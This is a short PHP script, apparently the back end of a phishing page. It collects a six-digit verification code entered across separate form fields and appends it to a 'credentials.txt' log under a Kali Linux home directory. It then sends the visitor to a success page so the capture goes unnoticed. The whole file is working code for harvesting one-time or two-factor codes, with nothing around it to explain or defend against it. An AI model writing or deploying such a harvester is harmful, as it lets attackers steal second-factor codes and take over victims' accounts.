<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted verification code
    $verification_code = htmlspecialchars(
        $_POST['digit1'] . $_POST['digit2'] . $_POST['digit3'] .
        $_POST['digit4'] . $_POST['digit5'] . $_POST['digit6']
    );

    // Define the path to the credentials file
    $file_path = "/home/kali/Clifty/logs/credentials.txt";

    // Save the verification code to the file
    $file = fopen($file_path, "a");
    if ($file) {
        fwrite($file, "FinalTest: " . $verification_code . "\n");
        fclose($file);
    } else {
        error_log("Unable to open file: " . $file_path);
    }

    // Redirect to a success page or any other page
    header("Location: success.html");
    exit();
}
?>
